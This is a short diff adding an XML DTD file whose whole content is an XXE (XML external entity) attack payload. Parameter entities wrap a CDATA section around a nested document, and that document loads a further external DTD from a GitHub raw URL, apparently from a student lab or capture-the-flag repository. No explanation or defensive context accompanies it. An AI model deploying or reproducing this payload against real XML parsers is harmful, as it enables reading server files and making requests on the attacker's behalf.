@@ -1,0 +1,4 @@
+<!ENTITY % modau "<![CDATA[">
+<!ENTITY % payload '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE message [<!ENTITY % ext SYSTEM "https://raw.githubusercontent.com/UIT-20522026/XML/main/6.dtd">%ext;]><message>&noidung;</message>'>
+<!ENTITY % ketthuc "]]>">
+<!ENTITY noidung "%modau;%payload;%ketthuc;">
